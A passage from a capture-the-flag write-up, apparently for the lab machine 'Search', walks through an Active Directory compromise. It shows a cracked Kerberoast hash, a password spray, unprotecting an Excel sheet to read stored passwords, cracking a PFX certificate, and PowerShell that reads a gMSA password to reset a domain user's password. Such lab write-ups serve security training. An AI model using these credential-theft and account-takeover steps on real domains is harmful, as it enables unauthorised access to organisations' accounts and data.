</span></span><span style="display:flex;"><span><span style="color:#e6db74">sAMAccountName</span>: web_svc <span style="color:#e6db74">memberOf</span>:  <span style="color:#e6db74">pwdLastSet</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">59</span>:<span style="color:#ae81ff">11</span><span style="color:#f92672">.</span><span style="color:#ae81ff">329031</span> <span style="color:#e6db74">lastLogon</span>:<span style="color:#f92672">&lt;</span>never<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">LDAP</span>        <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">389</span>    <span style="color:#66d9ef">RESEARCH</span>         $krb5tgs$23$*web_svc$SEARCH<span style="color:#f92672">.</span>HTB$RESEARCH<span style="color:#f92672">/</span>web_svc<span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">~</span><span style="color:#ae81ff">60001</span><span style="color:#f92672">*</span>$02e2197671d3052a59cb2f60fb2f1683$363d7b7757ba6300420c830065982b4f3cdd753739f76904dfdc2e7ba298604777d5d94c954e2b3d850a35456321549648132f9aacd952de7c40b8b5208eb740579e18424c015ac119a855672b335bdbee44dc302d837d18bc398f627adbc453ed09e32b878f609bb358c275898551eb66f9f5270f60218cfc0d7b61b894a7e71419d509c8d2454cbebddfc075988cb98b6a42415ff2395e55ea9809253acf37c1399d47711799806bf0f83b50f81227299f9499a4d2b44ad71b8f95adb433bf4a834c360bbe3955d9fdab8796019a0b22d8963c2433d6c614b7bddbae53ffc1ee66b1531d31faf1b28171d5f62eaac47407945507fcb36d4552255d114b1f3028dbbb2cce067e50baef307b79fee17d6ac69241f8fe42e76e4a057d12af62405ed2ebd4a2ed554c1fc071bf21e17bf763c7b0f8e8a21dd8d995598b29484574345c30edb8a6d3dd4e7a105727a17eb739a3f59e6d8ca8d91114772cb3cac6e3a1494535cd2bad476516db2da8918f2f9e2ba982d5ef62996b2a3489898763d58d44f1ba2c187a2d7ff1971ab733f87122dc4880ebc8b7bcd01441185c463424275f5edc082dfebc285b08e9f3d1914b35872af72935c8e3052beb09d920e5c7377dbed371bb6cd571944bc8f37b07d12c278ad04ee8db5953314d25410489bc576554e1bcebc4f471919e02a5a0aae99bfb9192ffbb1b0ffb0ddfd0aa0b4720986f93d881c978f23443e490f07ed36117a01745de2bc526149af03ea76541f0aaf8a0cf73bbc669cf3d938dcc3b0de44194e0c909310a363a2ffcf5051182a7cff0329cefd78637af39ea58ae9264ca9be5403766d471398b7a0f890346732dddc704f9707bf6f4bfc2987399ba495964cff6611bc80e1dd59d4d05fafb8a169075884d1e565ad83244af3a92f25c3f05579444a9ba8d252f7441b4d9cb01cd4aa584c026769058ca7adb9225c21f19fe4954e3833313963c839235892e91e94b6a581c85078380736f563fc65fbbca3d8c7a8ae7d77dad75ead34ba8f6c8c1f0854307bb30e21891b29b5f051e8cf97091302cce5c458dfabd181c052158cee63170efad0914c7811458e638c983ad0d0c68691dbcd0efff6c18c787dc19db431aff1bb7644b35aa92963d05d7cdc77692efd47329d7bdc074fe00285447c8d86d373ee7cda117dd9cf57daa9c6bbc3f34be4f4d6e73855c43e4256b4e3bf0bfa509dd561b44a0c6adf25cb6f749f6869867f28d8aeb206938b0c16dc3dec4851aa6cd028f626cb739790685447e89e70538af1390827b964ce7d2868c713a69c11dd78740749f27ca2db238e2cac78679aabf090f2479a11aff631f5084c76570532754a3043a58ed5f20ff09a1bf9533bf1562983f8007f4ca9fc1cdf34e84e611c32a5631c26d7f88528adcd03a78ae8939d81662d0a4b796fc39699265e7c85c11eb3c5c6973403a72fbcccc5ec498a75bdf
</span></span></code></pre></div><p>Using john to crack krb5tgs hash. New find new credentials <code>web_svc:@3ONEmillionbaby</code>. And we have access to new shares. There is bast number of new usernames in the  <code>RedirectedFolders$</code> share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>abril<span style="color:#f92672">.</span>suarez
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Angie</span><span style="color:#f92672">.</span>Duffy
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Antony</span><span style="color:#f92672">.</span>Russo
</span></span><span style="display:flex;"><span>belen<span style="color:#f92672">.</span>compton
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Cameron</span><span style="color:#f92672">.</span>Melendez
</span></span><span style="display:flex;"><span>chanel<span style="color:#f92672">.</span>bell
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Claudia</span><span style="color:#f92672">.</span>Pugh
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Cortez</span><span style="color:#f92672">.</span>Hickman
</span></span><span style="display:flex;"><span>dax<span style="color:#f92672">.</span>santiago
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Eddie</span><span style="color:#f92672">.</span>Stevens
</span></span><span style="display:flex;"><span>edgar<span style="color:#f92672">.</span>jacobs
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Edith</span><span style="color:#f92672">.</span>Walls
</span></span><span style="display:flex;"><span>eve<span style="color:#f92672">.</span>galvan
</span></span><span style="display:flex;"><span>frederick<span style="color:#f92672">.</span>cuevas
</span></span><span style="display:flex;"><span>hope<span style="color:#f92672">.</span>sharp
</span></span><span style="display:flex;"><span>jayla<span style="color:#f92672">.</span>roberts
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Jordan</span><span style="color:#f92672">.</span>Gregory
</span></span><span style="display:flex;"><span>payton<span style="color:#f92672">.</span>harmon
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Reginald</span><span style="color:#f92672">.</span>Morton
</span></span><span style="display:flex;"><span>santino<span style="color:#f92672">.</span>benjamin
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Savanah</span><span style="color:#f92672">.</span>Velazquez
</span></span><span style="display:flex;"><span>sierra<span style="color:#f92672">.</span>frye
</span></span><span style="display:flex;"><span>trace<span style="color:#f92672">.</span>ryan
</span></span></code></pre></div><p>Again trying <code>KERBEROS PRE AUTH.</code> But bad luck :( <code>No PRE AUTH</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> abril<span style="color:#f92672">.</span>suarez doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Angie.Duffy doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> <span style="color:#66d9ef">Antony</span><span style="color:#f92672">.</span>Russo doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User belen.compton doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> <span style="color:#66d9ef">Cameron</span><span style="color:#f92672">.</span>Melendez doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User chanel.bell doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> <span style="color:#66d9ef">Claudia</span><span style="color:#f92672">.</span>Pugh doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Cortez.Hickman doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> dax<span style="color:#f92672">.</span>santiago doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Eddie.Stevens doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> edgar<span style="color:#f92672">.</span>jacobs doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Edith.Walls doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> eve<span style="color:#f92672">.</span>galvan doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User frederick.cuevas doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> hope<span style="color:#f92672">.</span>sharp doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User jayla.roberts doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> <span style="color:#66d9ef">Jordan</span><span style="color:#f92672">.</span>Gregory doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User payton.harmon doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> <span style="color:#66d9ef">Reginald</span><span style="color:#f92672">.</span>Morton doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User santino.benjamin doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> <span style="color:#66d9ef">Savanah</span><span style="color:#f92672">.</span>Velazquez doesn<span style="color:#e6db74">'t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User sierra.frye doesn'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span><span style="display:flex;"><span><span style="color:#f92672">[-]</span> <span style="color:#66d9ef">User</span> trace<span style="color:#f92672">.</span>ryan doesn<span style="color:#960050;background-color:#1e0010">'</span>t have <span style="color:#66d9ef">UF_DONT_REQUIRE_PREAUTH</span> set
</span></span></code></pre></div><p>Now the last hope is that if a user hasv reused any password. Testing for password reuse. <strong>Testing Password</strong> =&gt; <code>@3ONEmillionbaby</code>
And we do have a user that has the used the same password, as <code>web_svc</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">205</span>  <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESEARCH</span>         <span style="color:#f92672">[+]</span> search<span style="color:#f92672">.</span>htb\edgar<span style="color:#f92672">.</span>jacobs:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">3</span><span style="color:#66d9ef">ONEmillionbaby</span>
</span></span></code></pre></div><h3 id="excel-file-enumeration">Excel File Enumeration</h3>
<p>Well still this Creds are working for ldap, smb. Winrm is not available. Enumerating files with each user we came across a file inside user <code>edgar</code>.  New file inside <code>edgar.jacobs's</code> desktop folder. It is a excel file. We are going to download the excel file, and further enumerate.</p>
<p><img alt="" src="/search/20211220141238.png"/></p>
<p>There is a missing column <code>C</code>, we we try to do anything we see an pop up.</p>
<p><img alt="" src="/search/20211220141322.png"/></p>
<p>Trying to make changes the excel file we do see that its protected. We can bypass the protection. Reference =&gt; <a href="https://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/">Remove password from excel site</a>
We will follow along this article, first it says we have to move the file to zip format.</p>
<p><img alt="" src="/search/20211220141039.png"/></p>
<p><img alt="" src="/search/20211220140618.png"/></p>
<p><img alt="" src="/search/20211220141055.png"/></p>
<p>Then we will open the zip file. And we can see the content of the excel file.</p>
<p><img alt="" src="/search/20211220141133.png"/></p>
<p>Now in order to remove the protection we will navigate to the worksheet 2.
The path to navigate is <code>XL -&gt; worksheets -&gt; Select the XML file.</code></p>
<p><img alt="" src="/search/20211220141524.png"/></p>
<p>We will open the file in any text editor, And we do see a line called <code>sheetProtection.</code> We will remove the protection.</p>
<p><img alt="" src="/search/20211220141630.png"/></p>
<p>Then we will save the changes, we will compress the file with <code>Zip</code> format. And change the type to excel.</p>
<p><img alt="" src="/search/20211220141945.png"/></p>
<p><img alt="" src="/search/20211220141750.png"/></p>
<p>After perfectly completing the steps shown in the article. We are able to get the passwords.</p>
<p><img alt="" src="/search/20211220142053.png"/></p>
<p>We will make a list of users and passwords</p>
<p><img alt="" src="/search/20211220142207.png"/></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="excels-password-spray">Excel’s Password Spray</h3>
<p>We will again use <code>crackmapexec</code> to find a user with <code>SMB/LDAP</code>. Command =&gt; <code>crackmapexec smb search.htb -u users.txt -p passwords.txt</code>. After some time <code>crackmapexec</code> revels that a user has <code>smb</code> permission.
The new credentials are =&gt; <code>Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18</code></p>
<p>The <code>Sierra</code> user has access to user flag, we can connect over and has access to the user.
Connecting to SMB we <code>RedirectedFolders$/sierra.frye/Desktop</code> we can find the user flag.</p>
<p>Now to get root flag, we have to get a shell, as we know Winrm is totally disabled we can enumerate further. After getting nothing, we do see a <code>/staff</code> that was 403 on web. Enumerating the shares, we do find a certificate of a client. <code>RedirectedFolders$/sierra.frye/Downloads/Backup</code></p>
<p><img alt="" src="/search/20211223151620.png"/></p>
<p>Now we have to import this in out browser. For this I am using Chrome. Fell free to use any browser.</p>
<p><img alt="" src="/search/20211222223429.png"/></p>
<p>It is asking password for the password we do have another file called <code>staff.pfx</code>. we can use a tool called <code>crackpksc12</code> or <code>p12tool</code>. For this machine i used <code>p12tool</code>. We will simple run the command shown in the Github read me file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>go run cmd<span style="color:#f92672">/</span>main<span style="color:#f92672">.</span>go crack <span style="color:#f92672">-</span>c staff<span style="color:#f92672">.</span>pfx <span style="color:#f92672">-</span>f <span style="color:#e6db74">/usr/s</span>hare<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou<span style="color:#f92672">.</span>txt
</span></span></code></pre></div><p>Now we finally have imported a certificate of staff.</p>
<p><img alt="" src="/search/20211222223439.png"/></p>
<p>After this when we visit the page we do get a 200 OK. and we have a login portal. It is asking for credentials, we can use the credentials of user <code>sierra</code>. for the computer name, we will use the domain name <code>research.search.htb</code>. And we are able to get the console.</p>
<h3 id="bloodhound">BloodHound</h3>
<p>Now we can use bloodhound to enumerate further in the AD. I used python-bloodhound. Because there is possibility, AV will block all scripts. So we will run bloodhound using python3.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>python3 <span style="color:#e6db74">/opt/</span><span style="color:#66d9ef">BloodHound</span><span style="color:#f92672">.</span>py<span style="color:#f92672">/</span>bloodhound<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>c <span style="color:#66d9ef">All</span> <span style="color:#f92672">-</span>u <span style="color:#e6db74">'Sierra.Frye'</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span style="color:#f92672">-</span>d <span style="color:#e6db74">'search.htb'</span> <span style="color:#f92672">-</span>ns <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">213</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Found</span> <span style="color:#66d9ef">AD</span> <span style="color:#e6db74">domain</span>: search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Connecting</span> to <span style="color:#66d9ef">LDAP</span> <span style="color:#e6db74">server</span>: research<span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Found</span> <span style="color:#ae81ff">1</span> domains
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Found</span> <span style="color:#ae81ff">1</span> domains <span style="color:#66d9ef">in</span> the forest
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Found</span> <span style="color:#ae81ff">113</span> computers
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Connecting</span> to <span style="color:#66d9ef">LDAP</span> <span style="color:#e6db74">server</span>: research<span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Found</span> <span style="color:#ae81ff">106</span> users
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Found</span> <span style="color:#ae81ff">63</span> groups
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Found</span> <span style="color:#ae81ff">0</span> trusts
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Starting</span> computer enumeration with <span style="color:#ae81ff">10</span> workers
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">100</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">99</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">98</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">97</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">96</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">95</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">94</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">93</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">92</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">91</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">WARNING</span>: <span style="color:#66d9ef">Could</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">resolve</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">99</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb: <span style="color:#66d9ef">The</span> <span style="color:#66d9ef">DNS</span> query name does <span style="color:#f92672">not</span> <span style="color:#e6db74">exist</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">99</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">INFO</span>: <span style="color:#66d9ef">Querying</span> <span style="color:#e6db74">computer</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">90</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#e6db74">WARNING</span>: <span style="color:#66d9ef">Could</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">resolve</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">93</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb: <span style="color:#66d9ef">The</span> <span style="color:#66d9ef">DNS</span> query name does <span style="color:#f92672">not</span> <span style="color:#e6db74">exist</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">93</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>									
</span></span><span style="display:flex;"><span>									<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>									
</span></span><span style="display:flex;"><span><span style="color:#e6db74">WARNING</span>: <span style="color:#66d9ef">Could</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">resolve</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb: <span style="color:#66d9ef">The</span> <span style="color:#66d9ef">DNS</span> query name does <span style="color:#f92672">not</span> <span style="color:#e6db74">exist</span>: <span style="color:#66d9ef">Windows</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>We will import all files in bloodhound. I have used bloodhound in windows, as my VM would keep crashing. For bloodhound we have to use neo4j.</p>
<p><img alt="" src="/search/20211220143233.png"/></p>
<p><img alt="" src="/search/20211220143843.png"/></p>
<p><img alt="" src="/search/20211220114119.png"/></p>
<p>The help menu of is straight forward. we have to use <code>GMSAPasswordReader.exe</code> and we will get the hash of the user.</p>
<p><img alt="" src="/search/20211220144018.png"/></p>
<p>In this machine, we have AV deleting all <code>exe</code>. so we have to manually execute all commands.  As we have Powershell, we will use the built-in net.exe binary. Getting started with the commands</p>
<h3 id="commands-for-gmsa-password">Commands for GMSA Password</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>) $gmsa <span style="color:#f92672">=</span> Get<span style="color:#f92672">-</span>ADServiceAccount <span style="color:#f92672">-</span>Identity <span style="color:#e6db74">'BIR-ADFS-GMSA$'</span> <span style="color:#f92672">-</span>Properties <span style="color:#e6db74">'msDS-ManagedPassword'</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>) $mp <span style="color:#f92672">=</span> $gmsa<span style="color:#f92672">.</span><span style="color:#e6db74">'msDS-ManagedPassword'</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>) $pt <span style="color:#f92672">=</span> ConvertFrom<span style="color:#f92672">-</span>ADManagedPasswordBlob $mp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>) $username <span style="color:#f92672">=</span> <span style="color:#e6db74">'BIR-ADFS-GMSA$'</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>) $cred <span style="color:#f92672">=</span> New<span style="color:#f92672">-</span>Object System<span style="color:#f92672">.</span>Management<span style="color:#f92672">.</span>Automation<span style="color:#f92672">.</span>PSCredential $username, $pt<span style="color:#f92672">.</span>SecureCurrentPassword
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>) Invoke<span style="color:#f92672">-</span>Command <span style="color:#f92672">-</span>ComputerName localhost <span style="color:#f92672">-</span>Credential $cred <span style="color:#f92672">-</span>ScriptBlock {whoami}
</span></span></code></pre></div><p>All we are doing is getting hash of the user <code>BIR-ADFS-GMSA$</code>. We can get the hash from <code>gMSADumper</code>.  Now if we have a look at bloodhound we do see a <code>generic all</code>  permission so we can change the password of the user <code>TRISTAN.DAVIES</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>Command <span style="color:#f92672">-</span>ComputerName localhost <span style="color:#f92672">-</span>Credential $cred <span style="color:#f92672">-</span>ScriptBlock {net user TRISTAN<span style="color:#f92672">.</span>DAVIES pwn123<span style="color:#f92672">!</span> <span style="color:#f92672">/</span>domain}
</span></span></code></pre></div><p>Now we will login into the share <code>C$</code> using the credentials <code>TRISTAN.DAVIES:pwn123!</code></p>
<p><img alt="" src="/search/20211223153059.png"/></p>
<p>And we have finally rooted the machine.</p>
<h2 id="taking-a-look-at-another-intended-part">Taking a look At Another Intended Part</h2>
<h3 id="remote-gmsa-password-dumper">Remote gMSA Password Dumper</h3>
<p>We know that we have to get the NTLM hash of user <code>BIR-ADFS-GMSA$</code>.  So i will use an another way, is to use a tool made by XCT and Micahvandeusen. The tools is called <a href="https://github.com/micahvandeusen/gMSADumper.git">gMSADumper </a>. This tool basically connect to the target and extracts the hash. The command can be found here =&gt;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>python3 gMSADumper<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>u <span style="color:#e6db74">'Sierra.Frye'</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span style="color:#f92672">-</span>d search<span style="color:#f92672">.</span>htb
</span></span></code></pre></div><p>Now we have the user <code>BIR-ADFS-GMSA$</code>, and its hash.
<img alt="" src="/search/20211220145021.png"/></p>
<p>Now we don’t have <code>winrm</code> so we will use RPC. There is a tool in kali <code>rpcclient</code>, We will use that tool.</p>
<h3 id="changing-password-of-the-user-tristandavies">Changing password Of The User <code>TRISTAN.DAVIES</code></h3>
